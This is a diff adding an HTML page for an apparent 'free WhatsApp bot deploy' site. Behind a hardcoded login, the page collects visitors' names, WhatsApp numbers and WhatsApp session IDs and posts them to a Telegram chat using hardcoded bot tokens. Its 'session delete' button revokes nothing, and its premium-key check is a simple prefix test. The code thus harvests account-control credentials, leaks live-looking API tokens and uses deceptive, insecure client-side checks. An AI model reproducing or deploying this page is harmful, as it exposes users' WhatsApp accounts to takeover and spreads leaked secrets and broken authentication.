@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>FREE BOT-POWERED CHALAH</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <style>
+    body {
+      background-color: #000;
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      width: 100%;
+      max-width: 500px;
+      padding: 20px;
+    }
+    .hidden {
+      display: none;
+    }
+    .login-box, .session-box {
+      background: linear-gradient(145deg, #1a1a1a, #000000);
+      box-shadow: 0 0 25px #00ffee;
+      border-radius: 20px;
+      padding: 30px;
+    }
+    h2 {
+      color: #00ffee;
+      text-align: center;
+    }
+    input, button, select {
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      border-radius: 12px;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    input {
+      background-color: #111;
+      color: #fff;
+    }
+    button:hover {
+      opacity: 0.9;
+    }
+    .login-box button {
+      background-color: #ff1493;
+      color: white;
+      box-shadow: 0 0 20px #ff1493;
+    }
+    .login-box button:hover {
+      background-color: #ff69b4;
+      box-shadow: 0 0 25px #ff69b4;
+    }
+    .submit-btn {
+      background-color: #00ffee;
+      color: black;
+      box-shadow: 0 0 20px #00ffee;
+    }
+    .delete-btn {
+      background-color: #ff0000;
+      color: white;
+      box-shadow: 0 0 20px #ff0000;
+    }
+    .delete-btn:hover {
+      background-color: #cc0000;
+      box-shadow: 0 0 25px #cc0000;
+    }
+    .error-msg {
+      color: red;
+      text-align: center;
+    }
+    .success-msg {
+      color: lime;
+      text-align: center;
+      font-size: 18px;
+      margin: 10px 0;
+      opacity: 1;
+      transition: opacity 2s ease-out;
+    }
+    .delete-success-msg {
+      color: red;
+      text-align: center;
+      font-size: 18px;
+      margin: 10px 0;
+      opacity: 1;
+      transition: opacity 2s ease-out;
+    }
+    .circle {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      background-color: black;
+      border: 5px solid #ff00cc;
+      box-shadow: 0 0 40px #ff00cc;
+      margin: 20px auto;
+      background-image: url('https://i.ibb.co/cWpXgYn/2681.jpg');
+      background-size: cover;
+      background-position: center;
+    }
+    .premium-btn {
+      background-color: gold;
+      color: black;
+      padding: 10px 25px;
+      border-radius: 20px;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 0 15px gold;
+      margin-bottom: 10px;
+      display: block;
+      width: 100%;
+    }
+    .about-btn {
+      background-color: #444;
+      color: white;
+      padding: 10px 25px;
+      border-radius: 20px;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 0 10px #00ffee;
+      margin-bottom: 20px;
+      display: block;
+      width: 100%;
+    }
+    select {
+      background-color: #111;
+      color: #00ffee;
+      border: 2px solid #00ffee;
+      box-shadow: 0 0 10px #00ffee;
+    }
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .modal-content {
+      background-color: #222;
+      padding: 40px;
+      border-radius: 10px;
+      text-align: center;
+      color: white;
+      max-width: 600px;
+      margin: auto;
+      text-shadow: 0 0 5px #00ff00;
+    }
+    .modal button {
+      background-color: #00ffee;
+      padding: 10px 25px;
+      border-radius: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .modal button:hover {
+      background-color: #ff1493;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box" id="loginBox">
+      <h2>Login</h2>
+      <input type="text" id="username" placeholder="Username" />
+      <input type="password" id="password" placeholder="Password" />
+      <button onclick="login()">Login</button>
+      <div id="error" class="error-msg"></div>
+    </div>
+    <div class="session-box hidden" id="sessionBox">
+      <div class="circle"></div>
+      <button class="premium-btn" onclick="openPremiumKeyModal()">PREMIUM</button>
+      <button class="about-btn" onclick="openAboutModal()">ABOUT</button>
+      <div id="botSelector" class="hidden">
+        <select id="selectedBot" required>
+          <option value="">-- Select a Bot --</option>
+          <option value="Asitha md">Asitha md</option>
+          <option value="Queen anju x pro">Queen anju x pro</option>
+          <option value="Manu Md">Manu Md</option>
+          <option value="Venom song md">Venom song md</option>
+          <option value="LAKA MD">LAKA MD</option>
+        </select>
+      </div>
+      <div id="successMessage" class="success-msg hidden"></div>
+      <div id="deleteSuccessMessage" class="delete-success-msg hidden"></div>
+      <form onsubmit="submitToTelegram(event)">
+        <input type="text" id="name" placeholder="Enter Full Name" required />
+        <input type="tel" id="whatsapp" placeholder="Enter WhatsApp Number" pattern="[0-9]{10}" required />
+        <input type="text" id="sessionId" placeholder="Enter Session ID" required />
+        <button type="submit" class="submit-btn">Submit</button>
+      </form>
+      <button class="delete-btn" onclick="openDeleteSessionModal()">SESSION DELETE</button>
+    </div>
+  </div>
+  <!-- About Modal -->
+  <div class="modal" id="aboutModal">
+    <div class="modal-content">
+      <h3>CHALAH FREE BOT DEPLOY SITE NEWS ❗</h3>
+      <p>සයිට් එකට සීසන් අයිඩී ඇඩ් කරපු වෙලාවෙම බොට් ඩිප්ලොය් වෙන්නෙ නැ</p>
+      <p>අඩුම පැය අටක් හෝ හතක් යාවි</p>
+      <p>බොට් ඩිප්ලොය් වුනහම ඔයාට මැසේජ් එකක් එනවා</p>
+      <p>බොට් ඩිප්ලොය් වෙලා බොට් වැඩ කරන්නෙ දවසක් හෝ දෙකක් පමනි</p>
+      <p>ඔයාට බොට් මාසෙටම ඩිප්ලොය් කරගන්න ඔනිනම් සයිට් එකෙ ප්‍රිමියම් එක BUY කරන්න ඔනි</p>
+      <button onclick="closeAboutModal()">OK</button>
+    </div>
+  </div>
+  <!-- Premium Key Modal -->
+  <div class="modal" id="premiumKeyModal">
+    <div class="modal-content">
+      <h3>Enter PREMIUM KEY</h3>
+      <input type="password" id="premiumKeyInput" placeholder="Enter Premium Key" />
+      <button onclick="checkPremiumKey()">Submit</button>
+    </div>
+  </div>
+  <!-- Delete Session Modal -->
+  <div class="modal" id="deleteSessionModal">
+    <div class="modal-content">
+      <h3>Delete Session ID</h3>
+      <input type="text" id="deleteSessionId" placeholder="Enter Session ID to Delete" required />
+      <button onclick="deleteSession()">DELETE</button>
+    </div>
+  </div>
+  <script>
+    let isPremiumUser = false;
+    // Store deleted session IDs in localStorage
+    const deletedSessions = JSON.parse(localStorage.getItem("deletedSessions")) || [];
+
+    function login() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const errorDiv = document.getElementById("error");
+      if (username === "FREE BOT" && password === "CHALAH1229") {
+        errorDiv.innerText = "";
+        document.getElementById("loginBox").classList.add("hidden");
+        document.getElementById("sessionBox").classList.remove("hidden");
+      } else {
+        errorDiv.innerText = "Invalid username or password.";
+      }
+    }
+
+    function openAboutModal() {
+      document.getElementById("aboutModal").style.display = "flex";
+    }
+
+    function closeAboutModal() {
+      document.getElementById("aboutModal").style.display = "none";
+    }
+
+    function openPremiumKeyModal() {
+      document.getElementById("premiumKeyModal").style.display = "flex";
+    }
+
+    function checkPremiumKey() {
+      const keyInput = document.getElementById("premiumKeyInput");
+      const key = keyInput.value.trim();
+      const usedKey = localStorage.getItem("usedPremiumKey");
+
+      if (usedKey && usedKey === key) {
+        alert("This PREMIUM KEY has already been used!");
+        keyInput.value = "";
+        return;
+      }
+
+      if (key.startsWith("CHALAH1229")) {
+        isPremiumUser = true;
+        localStorage.setItem("usedPremiumKey", key);
+        document.getElementById("botSelector").classList.remove("hidden");
+        alert("PREMIUM VERIFIED 👀!");
+      } else {
+        isPremiumUser = false;
+        document.getElementById("botSelector").classList.add("hidden");
+        alert("Invalid Key. Submissions will be marked as UN PREMIUM.");
+      }
+
+      keyInput.value = "";
+      document.getElementById("premiumKeyModal").style.display = "none";
+    }
+
+    function submitToTelegram(e) {
+      e.preventDefault();
+      const sessionId = document.getElementById("sessionId").value.trim();
+
+      // Check if session ID is deleted
+      if (deletedSessions.includes(sessionId)) {
+        alert("This Session ID has been deleted and cannot be reused!");
+        return;
+      }
+
+      const name = document.getElementById("name").value;
+      const whatsapp = document.getElementById("whatsapp").value;
+      const selectedBot = document.getElementById("selectedBot").value;
+
+      const status = isPremiumUser ? "PREMIUM USER" : "UN PREMIUM";
+      let message = `${status}\n*1. Full Name:* ${name}\n*2. WhatsApp:* ${whatsapp}\n*3. Session ID:* ${sessionId}`;
+
+      if (isPremiumUser && selectedBot) {
+        message = `*SELECTED BOT:* ${selectedBot}\n` + message;
+      }
+
+      const token = isPremiumUser ? "7842387803:AAF7dv3YRcjPT6boTH2c1O4ayIA1LBKcicc" : "7869145787:AAHCsYi9WCJ9XvvE_pIU7Ko-87gkaSxCUT8";
+      const chatId = "7306932383";
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown",
+        }),
+      })
+        .then(res => res.json())
+        .then(data => {
+          const successMsg = document.getElementById("successMessage");
+          successMsg.innerText = "YOUR DATA ADDED SUCCESS";
+          successMsg.classList.remove("hidden");
+          setTimeout(() => {
+            successMsg.style.opacity = "0";
+            setTimeout(() => {
+              successMsg.classList.add("hidden");
+              successMsg.style.opacity = "1";
+            }, 2000);
+          }, 3000);
+          document.getElementById("name").value = "";
+          document.getElementById("whatsapp").value = "";
+          document.getElementById("sessionId").value = "";
+          document.getElementById("selectedBot").value = "";
+        })
+        .catch(err => {
+          alert("Error sending message to Telegram");
+          console.error(err);
+        });
+    }
+
+    function openDeleteSessionModal() {
+      document.getElementById("deleteSessionModal").style.display = "flex";
+    }
+
+    function closeDeleteSessionModal() {
+      document.getElementById("deleteSessionModal").style.display = "none";
+    }
+
+    function deleteSession() {
+      const sessionId = document.getElementById("deleteSessionId").value.trim();
+      if (!sessionId) {
+        alert("Please enter a Session ID to delete.");
+        return;
+      }
+
+      // Add session ID to deleted list
+      deletedSessions.push(sessionId);
+      localStorage.setItem("deletedSessions", JSON.stringify(deletedSessions));
+
+      // Prepare message for Telegram
+      const message = `*SESSION DELETED*\n*Session ID:* ${sessionId}`;
+      const token = "7540336969:AAGI4lbWX3EscuO0GKGabrd153Ir85WVZrA";
+      const chatId = "7306932383";
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown",
+        }),
+      })
+        .then(res => res.json())
+        .then(data => {
+          const now = new Date();
+          const timeString = now.toLocaleString();
+          const deleteSuccessMsg = document.getElementById("deleteSuccessMessage");
+          deleteSuccessMsg.innerText = `SESSION DELETED SUCCESS\nSession ID: ${sessionId}\nDeleted at: ${timeString}`;
+          deleteSuccessMsg.classList.remove("hidden");
+          setTimeout(() => {
+            deleteSuccessMsg.style.opacity = "0";
+            setTimeout(() => {
+              deleteSuccessMsg.classList.add("hidden");
+              deleteSuccessMsg.style.opacity = "1";
+            }, 2000);
+          }, 3000);
+          document.getElementById("deleteSessionModal").style.display = "none";
+          document.getElementById("deleteSessionId").value = "";
+        })
+        .catch(err => {
+          alert("Error sending deletion message to Telegram");
+          console.error(err);
+        });
+    }
+  </script>
+</body>
+</html>
